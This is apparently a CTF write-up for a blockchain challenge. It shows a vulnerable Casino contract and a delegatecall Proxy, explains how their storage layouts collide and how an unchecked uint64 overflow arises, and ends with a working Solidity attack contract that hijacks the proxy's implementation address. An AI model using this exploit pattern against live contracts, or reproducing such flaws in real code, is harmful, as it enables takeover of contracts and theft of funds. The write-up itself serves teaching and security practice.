# Upgreadable Casino - Blockchain

## Challenge

We get 2 contracts. A casino contract that can be used to gamble using tokens.

```  
// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

contract Casino {  
   uint256 maxFreeTokens = 10;

   // Keep track of the tokens spent at each game  
   uint64 roulette = 0;  
   uint64 slotMachine = 0;  
   uint64 blackjack = 0;  
   uint64 poker = 0;

   address admin = 0x5aB8C62A01b00f57f6C35c58fFe7B64777749159;  
   mapping(address => uint256) balances;  
   mapping(address => uint256) lastFreeTokenRequest;

   function changeMaxFreeTokens(uint256 newValue) external  
   {  
       require(msg.sender == admin, "Only admin can change the number of free tokens you can get");  
       maxFreeTokens = newValue;  
   }

   function requestFreeTokens(uint256 numberOfTokensRequested) external {  
       require(numberOfTokensRequested <= maxFreeTokens, "You can't request that much free tokens");

       require(block.number > lastFreeTokenRequest[msg.sender] + 2,  
       "Wait a few more blocks before collecting free tokens");

       lastFreeTokenRequest[msg.sender] = block.number;

       balances[msg.sender] += numberOfTokensRequested;  
   }

   function playTokens(uint64 tokensForRoulette, uint64 tokensForSlotMachine,
uint64 tokensForBlackjack, uint64 tokensForPoker) external  
   {  
       require(tokensForRoulette + tokensForSlotMachine + tokensForBlackjack + tokensForPoker <= balances[msg.sender],  
       "You don't have enough tokens to play");

       // Increase the analytics variables  
       roulette += tokensForRoulette;  
       slotMachine += tokensForSlotMachine;  
       blackjack += tokensForBlackjack;  
       poker += tokensForPoker;

       balances[msg.sender] -= tokensForRoulette + tokensForSlotMachine + tokensForBlackjack + tokensForPoker;

       uint256 earnedTokens = 0;

       // Play the tokens at the chosen games

       // Roulette  
       earnedTokens += tokensForRoulette*2*(randMod(3) == 0 ? 1 : 0);  
  
       // Slot  
       earnedTokens += tokensForSlotMachine * 500 * (randMod(1000) == 0 ? 1 : 0);

       // Blackjack  
       earnedTokens += tokensForBlackjack * 15 * (randMod(21) == 0 ? 1 : 0);

       // Poker  
       earnedTokens += tokensForPoker * 10000 * (randMod(15000) == 0 ? 1 : 0);

       balances[msg.sender] += earnedTokens;  
   }

   // Initializing the state variable  
   uint randNonce = 0;  
  
   // Defining a function to generate  
   // a random number  
   function randMod(uint _modulus) internal returns(uint)  
   {  
       // increase nonce  
       randNonce++;  
       return uint(keccak256(abi.encodePacked(block.timestamp,msg.sender,randNonce))) % _modulus;  
   }

   function getBalance(address user) external view returns(uint256){  
       return balances[user];  
   }

   function buyTokens() payable external {  
       // deposit sizes are restricted to 1 ether  
       require(msg.value == 1 ether);

       balances[msg.sender] += 10000 ;  
   }  
}  
```

In addition we also get a proxy contract that is used for forwarding our calls
to the casino.

```  
// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

contract Proxy {  
   address _implementation;  
   address _owner = 0x5aB8C62A01b00f57f6C35c58fFe7B64777749159;
//0x0000000000000000000000000000000000000000;

   /**  
    * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.  
    *  
    * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded  
    * function call, and allows initializing the storage of the proxy like a Solidity constructor.  
    */  
   constructor(address _logic) payable {  
       _implementation = _logic;  
   }

   function getOwner() external view returns (address) {  
       return _owner;  
   }

   /**  
    * @dev Delegates the current call to `implementation`.  
    *  
    * This function does not return to its internal call site, it will return directly to the external caller.  
    */  
   function _delegate(address implementation) internal virtual {  
       assembly {  
           // Copy msg.data. We take full control of memory in this inline assembly  
           // block because it will not return to Solidity code. We overwrite the  
           // Solidity scratch pad at memory position 0.  
           calldatacopy(0, 0, calldatasize())

           // Call the implementation.  
           // out and outsize are 0 because we don't know the size yet.  
           let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

           // Copy the returned data.  
           returndatacopy(0, 0, returndatasize())

           switch result  
           // delegatecall returns 0 on error.  
           case 0 {  
               revert(0, returndatasize())  
           }  
           default {  
               return(0, returndatasize())  
           }  
       }  
   }

   /**  
    * @dev Delegates the current call to the address returned by `_implementation()`.  
    *  
    * This function does not return to its internal call site, it will return directly to the external caller.  
    */  
   function _fallback() internal virtual {  
       _delegate(_implementation);  
   }

   /**  
    * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other  
    * function in the contract matches the call data.  
    */  
   fallback() external payable virtual {  
       _fallback();  
   }

   /**  
    * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data  
    * is empty.  
    */  
   receive() external payable virtual {  
       _fallback();  
   }

   /**  
    * @dev Stores a new address in the EIP1967 implementation slot.  
    */  
   function _setImplementation(address newImplementation) private {  
       _implementation = newImplementation;  
   }

   /**  
    * @dev Perform implementation upgrade  
    *  
    * Emits an {Upgraded} event.  
    */  
   function _upgradeTo(address newImplementation) internal {  
       _setImplementation(newImplementation);  
   }

   /**  
    * @dev Upgrade the implementation of the proxy to `newImplementation`.  
    *  
    * Calls {_authorizeUpgrade}.  
    *  
    * Emits an {Upgraded} event.  
    */  
   function upgradeTo(address newImplementation) external {  
       require(_owner == msg.sender, "Ownable: caller is not the owner");  
       _implementation = newImplementation;  
   }  
}

```

Our goal is to set the address of the implementation to an address provided by
the organizers.

## Solution

Proxies in CTFs, especially in combination with delegatecall, are usually a
problem. In this case we have the same problems as always, the variables have
a different layout in the proxy, as in the Casino. There are 2 seperate
vulnerabilities we need to exploit to be able to win this chall.  
- DelegateCall  
- Integer Overflow

### 1. Delegatecall

The layout of the variable overlaps. So if we call the casino through the
proxy, we overwrite proxy variables if we try changing casino variables. In
our case the interesting variable is the implementation variable. This
variable overlaps with 3 of the variables in Casino. The ones for Blackjack,
Slot & Roulette. As those are only 8 byte big and the addres is 20 byte big
only half of the blackjack variable overlaps. In my case the old
implementation address was 0x5aB8C62A01b00f57f6C35c58fFe7B64777749159. I tried
to show the overlap a bit below.

```  
0x 5aB8C62A 01b00f57f6C35c58 fFe7B64777749159  
 I Black  I  Slot Machine  I    Roulette  
```

### 2. Integer overflow

In the playTokens() function all token ammounts we want to add together are
added together and then checked if the total is smaller than our balance. But
there is no check for integer Overflows. So if we would for example aDD
0xFFFFFFFFFFFFFFFF and 0x0000000000000001 it would result in
0x0000000000000000

## 3. Exploit

We can use both of these to exploit. We can use the 4th variable (poker)
together with the overflow to be able to overwrite arbitrary parts of the
address without needing to own any tokens at all. Below you can see my attack
contract:

```  
// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

import "./Casino.sol";

contract Attack  
{  
   Casino target;

   constructor(address _target)  
   {  
       target = Casino(_target);  
   }

   function missionOverWrite() public  
   {  
       target.playTokens(0xfd48b1cf88b15bdd, 0, 0, 0x2b74e30774ea423);  
       target.playTokens(0, 0x5f54b6656fc56e05, 0, 0xa0ab499a903a91fb);  
       target.playTokens(0, 0, 0x7746d726, 0xffffffff88b928da);  
   }  
}  
```  
Now you just need to deploy this contract and call missionOverWrite()

--> Flag

Original writeup
(https://github.com/J4X-98/Writeups/blob/main/CTFs/DavinciCTF%202023/Upgreadable%20Casino/writeup.md).